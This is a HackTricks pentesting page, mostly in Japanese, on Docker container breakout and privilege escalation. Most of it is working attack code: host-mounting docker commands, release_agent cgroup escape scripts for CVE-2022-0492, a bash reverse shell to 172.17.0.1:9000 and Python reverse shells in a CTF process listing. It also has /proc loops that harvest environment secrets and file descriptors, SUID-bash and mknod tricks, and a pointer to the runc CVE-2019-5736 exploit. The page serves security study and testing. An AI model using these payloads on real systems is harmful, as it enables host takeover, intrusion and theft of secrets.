# Docker Breakout / Privilege Escalation

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
世界で**最も進んだ**コミュニティツールを駆使して、簡単に**ワークフローを構築し自動化する**ために[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 自動列挙 & 脱出

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): コンテナの列挙も**できます**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、入っているコンテナを列挙し、自動的に脱出を試みるのに**非常に役立ちます**
* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持っている権限を取得し、それから脱出する方法を見つけるのに役立つツール
* [**deepce**](https://github.com/stealthcopter/deepce): コンテナの列挙と脱出をするツール
* [**grype**](https://github.com/anchore/grype): イメージにインストールされているソフトウェアに含まれるCVEを取得する

## マウントされたDockerソケット脱出

もし何らかの方法で**dockerソケットがdockerコンテナ内にマウントされている**ことがわかった場合、それから脱出することができます。\
これは通常、何らかの理由でdockerデーモンに接続してアクションを実行する必要があるdockerコンテナで発生します。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
この場合、dockerデーモンと通信するために通常のdockerコマンドを使用できます：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
**dockerソケットが予期しない場所にある場合**でも、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドで通信することができます。
{% endhint %}

Dockerデーモンは、[ポート（デフォルトでは2375、2376）でリスニングしている可能性もあります](../../../../network-services-pentesting/2375-pentesting-docker.md)。また、Systemdベースのシステムでは、Systemdソケット`fd://`を介してDockerデーモンと通信することができます。

{% hint style="info" %}
さらに、他の高レベルランタイムのランタイムソケットにも注意してください：

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

コンテナのcapabilitiesをチェックし、以下のいずれかを持っている場合、脱出することができるかもしれません：**`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

現在のコンテナのcapabilitiesは、**以前に述べた自動ツール**を使用するか、以下の方法で確認できます：
```bash
capsh --print
```
以下のページでは、**Linuxの機能についてさらに学び**、それらを悪用して権限をエスケープ/エスカレーションする方法について学ぶことができます：

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## 特権コンテナからの脱出

特権コンテナは、`--privileged`フラグを使用するか、特定の防御を無効にすることで作成できます：

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label=disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev`のマウント

`--privileged`フラグは重大なセキュリティ上の懸念を引き起こし、エクスプロイトはそれが有効になっているDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスへの完全なアクセス権を持ち、seccomp、AppArmor、Linuxの機能からの制限がありません。`--privileged`のすべての効果については、このページで**読むことができます**：

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特権 + hostPID

これらの権限を持っていると、rootとしてホストで実行されているプロセスの名前空間に移動することができます。例えばinit（pid:1）に対して、次のコマンドを実行するだけです：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

コンテナで実行してテストします：
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 特権

特権フラグを使用するだけで、**ホストのディスクにアクセス**を試みたり、**release\_agentやその他のエスケープを悪用して脱出**を試みることができます。

以下のバイパスをコンテナで実行してテストします:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### ディスクのマウント - Poc1

適切に設定されたDockerコンテナは、**fdisk -l** のようなコマンドを許可しません。しかし、フラグ `--privileged` や `--device=/dev/sda1` がキャップと共に誤って設定されたDockerコマンドでは、ホストドライブを見る権限を得ることが可能です。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

したがって、ホストマシンを乗っ取ることは簡単です：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
And voilà ! ホストのファイルシステムにアクセスできるようになりました。それは `/mnt/hola` フォルダにマウントされています。

#### ディスクのマウント - Poc2

コンテナ内で、攻撃者はクラスターによって作成された書き込み可能なhostPathボリュームを介して基盤となるホストOSへのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用できるかどうかを確認するためにコンテナ内でチェックできる一般的なことです：
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 特権エスケープ 既存の release\_agent の悪用 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="初期のPoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### 特権エスケープの悪用：作成された release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="第二のPoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

技術の**説明**は以下で確認できます：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### 特権エスケープ release\_agentを利用した相対パス不明時の悪用 - PoC3

以前のエクスプロイトでは、**ホストファイルシステム内のコンテナの絶対パスが漏洩されています**。しかし、常にそうとは限りません。**ホスト内のコンテナの絶対パスが分からない場合**には、この技術を使用できます：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
実行されたPoCは、特権コンテナ内で以下のような出力を提供するはずです：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 権限昇格を悪用するセンシティブなマウント

いくつかのファイルがマウントされている可能性があり、それらは**基盤となるホストに関する情報**を提供するかもしれません。中には、何かが起こったときにホストによって実行されることを示すものもあります（これにより攻撃者はコンテナから脱出することができます）。\
これらのファイルの悪用により、以下が可能になるかもしれません：

* release\_agent（既に前述）
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

しかし、このページで**他のセンシティブなファイル**をチェックすることもできます：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意のマウント

いくつかの場合、**コンテナにホストからのボリュームがマウントされている**ことがわかります。このボリュームが正しく設定されていない場合、**センシティブなデータにアクセス・変更する**ことができるかもしれません：シークレットの読み取り、ssh authorized\_keysの変更など。
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2つのシェルとホストマウントを使用した権限昇格

**コンテナ内でrootとしてアクセス**でき、ホストからマウントされたフォルダーがあり、**非特権ユーザーとしてホストに脱出**し、マウントされたフォルダーに対する読み取りアクセス権を持っている場合、\
**コンテナ内のマウントされたフォルダー**に**bash suidファイル**を作成し、**ホストから実行**して権限昇格を行うことができます。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### ホスト内での権限昇格に2つのシェルを使用

コンテナ内で**rootとしてアクセス**があり、ホストに**非特権ユーザーとして脱出**した場合、コンテナ内にMKNODの機能がある場合（デフォルトで存在）、[**この投稿で説明されているように**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)、ホスト内での権限昇格（privesc）を悪用することができます。\
この機能を持つと、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**基盤となるハードウェアやカーネルモジュールにアクセス**するために使用される特別なファイルです。例えば、/dev/sdaブロックデバイスファイルは、**システムディスク上の生データを読む**アクセスを提供します。

Dockerは、コンテナ内でブロックデバイスが**悪用されないように**、ブロックデバイスの読み書きをブロックするcgroupポリシーをコンテナに設定しています。\
しかし、コンテナ内でブロックデバイスが**作成された場合**、/proc/PID/root/フォルダを通じて、コンテナの**外側にいる人がアクセス**することができますが、制限は**プロセスがコンテナの外側と内側で同じユーザーによって所有されている必要がある**ことです。

この[**ライトアップ**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)からの**悪用**例：
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

ホストのプロセスにアクセスできる場合、それらのプロセスに保存されている多くの機密情報にアクセスできるようになります。テストラボを実行します：
```
docker run --rm -it --pid=host ubuntu bash
```
例えば、`ps auxn` のようなコマンドを使用してプロセスをリストし、コマンド内の機密情報を探すことができます。

その後、**ホストの各プロセスに /proc/ を通じてアクセスできるため、次のコマンドを実行して env secrets を盗むことができます**：
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
You can also **他のプロセスのファイルディスクリプタにアクセスし、開いているファイルを読むことができます**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
プロセスを**終了させてDoSを引き起こす**こともできます。

{% hint style="warning" %}
もし何らかの方法でコンテナの外部のプロセスに対する特権的な**アクセスを持っている場合**、`nsenter --target <pid> --all` や `nsenter --target <pid> --mount --net --pid --cgroup` を実行して、そのプロセスと**同じns制限でシェルを実行**することができます（願わくば制限はありません）。
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
### hostIPC

コンテナがDockerの[ホストネットワーキングドライバ (`--network=host`)](https://docs.docker.com/network/host/)で設定されている場合、そのコンテナのネットワークスタックはDockerホストから隔離されていません（コンテナはホストのネットワーキング名前空間を共有しています）、そしてコンテナには独自のIPアドレスが割り当てられません。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインドします**。さらに、コンテナは共有インターフェース`tcpdump -i eth0`でホストが送受信している**すべてのネットワークトラフィックを傍受することができます**。

例えば、これを使用してホストとメタデータインスタンス間のトラフィックを**傍受し、さらには偽装する**ことができます。

以下の例のように：

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

また、ホスト内の**localhostにバインドされたネットワークサービスにアクセスする**ことや、ノードの**メタデータ権限にアクセスする**こともできます（これはコンテナがアクセスできるものと異なる可能性があります）。
```
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true`が設定されている場合、多くのことはできない可能性が高いです。ホスト上のプロセスや他のポッド内のプロセスがホストの**プロセス間通信メカニズム**（共有メモリ、セマフォ配列、メッセージキューなど）を使用している場合、それらのメカニズムに対して読み書きができるようになります。最初にチェックしたい場所は`/dev/shm`で、これは`hostIPC=true`を持つ任意のポッドとホストとで共有されています。また、`ipcs`を使って他のIPCメカニズムも調べたいと思うでしょう。

* **/dev/shmを調査する** - この共有メモリの場所にあるファイルを探す: `ls -la /dev/shm`
* **既存のIPC設備を調査する** - `/usr/bin/ipcs`を使って、IPC設備が使用されているかどうかを確認できます。以下でチェックしてください: `ipcs -a`

### 権限を回復する

システムコール**`unshare`**が禁止されていない場合、以下を実行してすべての権限を回復できます:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### ユーザー名前空間を介したシンボリックリンクによる悪用

この投稿で説明されている2つ目のテクニック [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) は、ユーザー名前空間を使ったバインドマウントを悪用して、ホスト内のファイルに影響を与える方法（具体的にはファイルを削除する）を示しています。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) を使用して、世界で最も進んだコミュニティツールによって動力を供給された **ワークフローを簡単に構築し、自動化**します。
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE

### Runc exploit (CVE-2019-5736)

rootとして `docker exec` を実行できる場合（おそらくsudoを使用）、CVE-2019-5736（[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)のexploit）を悪用してコンテナから脱出し、権限を昇格させることができます。このテクニックは基本的に **ホスト** の _**/bin/sh**_ バイナリを **コンテナから上書き** し、docker execを実行する人がペイロードをトリガーする可能性があります。

ペイロードを適切に変更し、`go build main.go` でmain.goをビルドします。結果として得られるバイナリは、実行のためにdockerコンテナに配置する必要があります。
実行後、`[+] Overwritten /bin/sh successfully` と表示されたら、ホストマシンから次のコマンドを実行する必要があります：

`docker exec -it <container-name> /bin/sh`

これにより、main.goファイルに存在するペイロードがトリガーされます。

詳細については：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
コンテナが脆弱である可能性のある他のCVEもあります。リストは [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) で見つけることができます。
{% endhint %}

## Docker カスタムエスケープ

### Docker エスケープサーフェス

* **名前空間:** プロセスは名前空間を介して他のプロセスから **完全に分離される** べきで、名前空間のために他のプロセスとの相互作用はエスケープできません（デフォルトではIPC、unixソケット、ネットワークサービス、D-Bus、他のプロセスの `/proc` と通信できません）。
* **Rootユーザー:** デフォルトではプロセスを実行するユーザーはrootユーザーです（ただし、その権限は限定されています）。
* **権限:** Dockerは以下の権限を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **システムコール:** これらは **rootユーザーが呼び出すことができない** システムコールです（権限の不足とSeccompのため）。他のシステムコールはエスケープを試みるために使用できるかもしれません。

{% tabs %}
{% tab title="x64 システムコール" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
```
{% endtab %}

{% tab title="syscall_bf.c" %}
```
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
